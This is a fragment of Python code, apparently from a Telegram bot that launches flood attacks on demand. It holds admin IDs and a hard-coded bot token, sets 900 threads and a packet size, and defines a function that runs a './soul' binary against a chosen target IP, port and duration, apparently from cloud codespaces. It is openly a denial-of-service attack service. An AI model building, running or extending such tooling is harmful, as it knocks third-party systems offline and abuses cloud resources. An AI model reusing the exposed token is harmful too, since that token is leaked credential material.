...
ADMIN_IDS = [1073690504,688144184]
BOT_TOKEN = "8314820492:AAHUlShscn1p6zS9UVHyApOKjsM8qW901Eg"
thread_count = 900
packet_size = 9
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command = f"./soul {target_ip} {target_port} {duration} {packet_size} {thread_count}"
